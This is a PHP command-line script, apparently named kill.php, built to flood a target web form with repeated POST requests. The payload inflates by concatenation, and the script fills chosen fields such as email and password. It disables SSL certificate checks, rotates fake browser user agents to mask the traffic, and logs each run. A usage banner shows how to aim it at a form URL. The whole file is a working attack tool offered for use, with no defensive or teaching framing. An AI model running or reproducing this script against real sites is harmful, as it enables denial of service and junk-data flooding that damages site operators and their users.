<?php
	$payload_path = "data/payload.enc";
	$da_payload = file_get_contents($payload_path);
	$da_payload .= uniqid();

	$log = fopen("log.AcX", "a");
	$logs = "=== Log ===\n";

	if(isset($argv[1])){
		if(strtolower($argv[1]) == "flood"){
			$da_target = isset($argv[2]) ? $argv[2] : "";
			$da_count = isset($argv[3]) ? $argv[3] : 0;
			$da_parameter = isset($argv[4]) ? $argv[4] : "";
			$da_payload_count = isset($argv[5]) ? $argv[5] : 0;

			if($da_payload_count > 0){
				for($i = 0; $i < $da_payload_count; $i++){
					$da_payload .= $da_payload."@mail.com";
				}
			}
			if($da_target == "" || strlen($da_target) <= 0){
				print_r("[ Error ] Input da target !\n");
			}else{
				if($da_count == 0){
					print_r("[ Error ] Input da count !\n");
				}else{
					if(!is_int((int) $da_count)){
						print_r("[ Error ] Input da count with Integer !\n");
					}else{
						if(strlen($da_parameter) <= 0){
							print_r("[ Error ] Input da parameter !\n");
						}else{
							$param = null;
							$explosive = explode("+", $da_parameter);
							for($i = 0; $i < count($explosive); $i++){
								$param = array($explosive[$i]=>$da_payload);
							}
							for($i = 0; $i < $da_count; $i++){
								$status = da_start($da_target, $da_count, $param)["http_code"];
								if($status == 200){
									print_r("=====\n");
									print_r("[ Status ] : ".$status."\n");
									print_r("=====\n");
									print_r("[ Data ] : ".$da_payload."\n");
								}else{
									print_r("=====\n");
									print_r("[ Status ] : ".$status."\n");
									print_r("=====\n");
									print_r("[ Data ] : ".$da_payload."\n");
									break;
								}
							}
							$logs .= "======================================================\n";
							$logs .= "[ Host ] \t\t\t\t: ".$da_target."\n";
							$logs .= "[ Http Code ] \t\t\t: ".$status."\n";
							$logs .= "[ Command ] \t\t\t: ".$argv[1]."\n";
							$logs .= "[ Count ] \t\t\t\t: ".$da_count."\n";
							$logs .= "[ Parameter ] \t\t\t: ".$argv[4]."\n";
							$logs .= "[ Payload Count ] \t\t: ".$da_payload_count."\n";
							$logs .= "[ Payload Path ] \t\t: ".$payload_path."\n";
							$logs .= "=======================================================\n";
							fwrite($log, $logs);
							fclose($log);
							print_r("==== [ Done ] ====\n");
						}
					}
				}
			}
		}
	}else{
		$ban = "[ Usage ]\n";
		$ban .= "php kill.php [command] [target] [count] [parameter] [num payload ( optional )]\n";
		$ban .= "====\n";
		$ban .= "php kill.php flood http://target.com/form.php 10 email+password 2\n";
		print_r($ban);
	}
	function da_start($target, $count, $param){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $target);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
		curl_setopt($ch, CURLOPT_TCP_FASTOPEN, 1);
		$agents = array(
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100508 SeaMonkey/2.0.4',
	'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
	'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1');
		curl_setopt($ch,CURLOPT_USERAGENT,$agents[array_rand($agents)]);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
		curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
		$da_exec = curl_exec($ch);
		$da_info = curl_getinfo($ch);
		curl_close($ch);

		return $da_info;
	}

?>
